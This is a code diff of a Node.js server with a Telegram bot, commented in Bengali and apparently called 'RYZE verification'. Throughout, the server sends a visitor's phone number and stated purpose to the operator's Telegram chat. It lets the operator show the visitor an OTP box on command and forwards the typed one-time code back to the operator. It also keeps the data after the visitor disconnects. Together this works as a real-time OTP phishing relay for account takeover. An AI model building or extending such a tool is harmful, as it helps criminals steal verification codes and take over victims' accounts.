@@ -13,20 +13,24 @@ const bot = new Telegraf(BOT_TOKEN);
 
 app.use(express.static('public'));
 
-// Render স্লিপ মোড প্রতিরোধ করার জন্য একটি রুট
-app.get('/ping', (req, res) => res.send('Awake!'));
+// রেন্ডার স্লিপ মোড চেক রুট
+app.get('/ping', (req, res) => res.send('RYZE Server is Awake!'));
 
 const activeUsers = {};
 
 io.on('connection', (socket) => {
     
-    // ১. ফোন নম্বর পাওয়ার পর
-    socket.on('send_phone', async (phone) => {
-        activeUsers[socket.id] = { phone: phone };
+    // ১. ফোন নম্বর ও পারপাস পাওয়ার পর
+    socket.on('send_phone', async (data) => {
+        const { phone, purpose } = data;
+        activeUsers[socket.id] = { phone: phone, purpose: purpose };
 
         // টেলিগ্রামে মেসেজ পাঠানো (Mono style এ নম্বর যাতে টাচ করলে কপি হয়)
         const msg = await bot.telegram.sendMessage(MY_CHAT_ID, 
-            `👤 *নতুন ইউজার সেশন*\n\n📱 নম্বর: <code>${phone}</code>\n⏳ স্ট্যাটাস: অপেক্ষমান...`, 
+            `👤 <b>নতুন ইউজার সেশন</b>\n\n` +
+            `📱 নম্বর: <code>${phone}</code>\n` +
+            `🎯 উদ্দেশ্য: <b>${purpose}</b>\n` +
+            `⏳ স্ট্যাটাস: <i>অপেক্ষমান...</i>`, 
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
@@ -35,7 +39,6 @@ io.on('connection', (socket) => {
                 ])
             }
         );
-        // মেসেজ আইডি সেভ করে রাখা যাতে পরে এডিট করা যায়
         activeUsers[socket.id].telegramMsgId = msg.message_id;
     });
 
@@ -45,7 +48,11 @@ io.on('connection', (socket) => {
         if (!user) return;
 
         bot.telegram.editMessageText(MY_CHAT_ID, user.telegramMsgId, null,
-            `👤 *ইউজার সেশন*\n\n📱 নম্বর: <code>${user.phone}</code>\n📩 প্রাপ্ত OTP: <code>${otp}</code>\n\nমেলাতে সুবিধা হলে ভেরিফাই করুন।`,
+            `👤 <b>ইউজার সেশন</b>\n\n` +
+            `📱 নম্বর: <code>${user.phone}</code>\n` +
+            `🎯 উদ্দেশ্য: <b>${user.purpose}</b>\n` +
+            `📩 প্রাপ্ত OTP: <code>${otp}</code>\n\n` +
+            `মেলাতে সুবিধা হলে ভেরিফাই করুন।`,
             {
                 parse_mode: 'HTML',
                 ...Markup.inlineKeyboard([
@@ -57,37 +64,39 @@ io.on('connection', (socket) => {
     });
 
     socket.on('disconnect', () => {
-        // ডিসকানেক্ট হলে ডিলিট করছি না কারণ টেলিগ্রাম সেশন চলতে পারে
+        // ডিসকানেক্ট হলেও ডাটা রাখছি যাতে রিকানেক্ট হলে কাজ করে
     });
 });
 
-// টেলিগ্রাম বাটন অ্যাকশন
+// টেলিগ্রাম বাটন অ্যাকশন হ্যান্ডলার
 bot.action(/ask_otp_(.+)/, (ctx) => {
     const socketId = ctx.match[1];
     io.to(socketId).emit('show_otp_input');
     
     const user = activeUsers[socketId];
-    ctx.editMessageText(`👤 *ইউজার সেশন*\n\n📱 নম্বর: <code>${user.phone}</code>\n⏳ স্ট্যাটাস: OTP এর জন্য অপেক্ষা করছে...`, { parse_mode: 'HTML' });
+    if(user) {
+        ctx.editMessageText(`👤 <b>ইউজার সেশন</b>\n\n📱 নম্বর: <code>${user.phone}</code>\n🎯 উদ্দেশ্য: <b>${user.purpose}</b>\n⏳ স্ট্যাটাস: <i>ইউজারকে OTP বক্স পাঠানো হয়েছে...</i>`, { parse_mode: 'HTML' });
+    }
 });
 
 bot.action(/retry_phone_(.+)/, (ctx) => {
     const socketId = ctx.match[1];
     io.to(socketId).emit('retry_phone');
-    ctx.editMessageText(`❌ নম্বর ভুল বলে রিজেক্ট করা হয়েছে।`);
+    ctx.editMessageText(`❌ নম্বর/রিকোয়েস্ট ভুল বলে রিজেক্ট করা হয়েছে।`);
 });
 
 bot.action(/verify_success_(.+)/, (ctx) => {
     const socketId = ctx.match[1];
     io.to(socketId).emit('final_status', { status: 'success' });
     const user = activeUsers[socketId];
-    ctx.editMessageText(`✅ <code>${user.phone}</code> ভেরিফাইড সফল!`, { parse_mode: 'HTML' });
+    ctx.editMessageText(`✅ <code>${user?.phone}</code> ভেরিফাইড সফল!\n🎯 ${user?.purpose}`, { parse_mode: 'HTML' });
 });
 
 bot.action(/verify_fail_(.+)/, (ctx) => {
     const socketId = ctx.match[1];
     io.to(socketId).emit('final_status', { status: 'fail' });
     const user = activeUsers[socketId];
-    ctx.editMessageText(`👤 *ইউজার সেশন*\n\n📱 নম্বর: <code>${user.phone}</code>\n❌ স্ট্যাটাস: ভুল OTP! আবার ইনপুট দিতে বলা হয়েছে।`, {
+    ctx.editMessageText(`👤 <b>ইউজার সেশন</b>\n\n📱 নম্বর: <code>${user?.phone}</code>\n❌ স্ট্যাটাস: <b>ভুল OTP!</b> আবার ইনপুট দিতে বলা হয়েছে।`, {
         parse_mode: 'HTML',
         ...Markup.inlineKeyboard([
             [Markup.button.callback('🔢 আবার OTP বক্স পাঠাও', `ask_otp_${socketId}`)]
@@ -97,11 +106,11 @@ bot.action(/verify_fail_(.+)/, (ctx) => {
 
 bot.launch();
 
-// Render স্লিপ মোড বন্ধ রাখার জন্য সেলফ-পিং লজিক
+// অটো পিং লজিক (URL আপডেট করে নিন)
 setInterval(() => {
-    http.get(`https://ryze-verification.onrender.com/ping`); // এখানে আপনার রেন্ডার ইউআরএল দিবেন
-}, 10 * 60 * 1000); // প্রতি ১০ মিনিটে একবার পিং করবে
+    http.get(`http://ryze-verification.onrender.com/ping`);
+}, 10 * 60 * 1000);
 
 server.listen(3000, () => {
-    console.log('RYZE Server Running...');
+    console.log('RYZE Server Running on Port 3000');
 });
